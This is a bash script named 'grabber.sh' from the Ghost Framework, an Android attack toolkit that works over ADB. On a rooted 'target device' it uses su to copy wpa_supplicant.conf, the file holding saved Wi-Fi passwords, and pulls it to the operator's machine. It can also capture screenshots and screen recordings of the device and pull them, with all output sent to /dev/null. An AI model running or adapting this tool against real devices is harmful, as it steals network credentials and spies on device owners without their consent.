#!/bin/bash

#            ---------------------------------------------------
#                              Ghost Framework                                                  
#            ---------------------------------------------------
#                Copyright (C) <2019-2020>  <Entynetproject>
#
#        This program is free software: you can redistribute it and/or modify
#        it under the terms of the GNU General Public License as published by
#        the Free Software Foundation, either version 3 of the License, or
#        any later version.
#
#        This program is distributed in the hope that it will be useful,
#        but WITHOUT ANY WARRANTY; without even the implied warranty of
#        MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
#        GNU General Public License for more details.
#
#        You should have received a copy of the GNU General Public License
#        along with this program.  If not, see <http://www.gnu.org/licenses/>.

G="\033[1;34m[*] \033[0m"
E="\033[1;31m[-] \033[0m"

{
chr=$(adb which su)
} &> /dev/null

if [[ "$1" = "-h" || "$1" = "--help" ]]
then
echo -e "Usage: grabber.sh [option] <arguments>"
echo -e
echo -e "  -w, --wgrabber   <local_path>  Grab wpa_supplicant."
echo -e "  -s, --screenshot <local_path>  Take device screenshot."
echo -e "  -r, --screenrec  <local_path>  Record device screen."
echo -e "  -h, --help                     Give this help list."
exit

elif [[ "$1" = "-w" ]]; then
    if [[ $chr = "" ]]; then
        echo -e ""$E"Target device is not rooted!"
    else
        {
        adb shell su 0 'cp /data/misc/wifi/wpa_supplicant.conf /sdcard/'
        adb pull /sdcard/wpa_supplicant.conf $2
        } &> /dev/null
    fi
    exit

elif [[ "$1" = "-s" ]]; then
    {
    adb shell screencap /sdcard/screen.png > /dev/null
    adb pull /sdcard/screen.png $2
    } &> /dev/null
    exit
   
elif [[ "$1" = "-r" ]]; then
    {
    adb shell screenrecord /sdcard/screen.mp4
    adb pull /sdcard/screen.mp4 $2
    } &> /dev/null
    exit
fi

echo -e "Usage: grabber.sh [option] <arguments>"
echo -e
echo -e "  -w, --wgrabber   <local_path>  Grab wpa_supplicant."
echo -e "  -s, --screenshot <local_path>  Take device screenshot."
echo -e "  -r, --screenrec  <local_path>  Record device screen."
echo -e "  -h, --help                     Give this help list."
exit
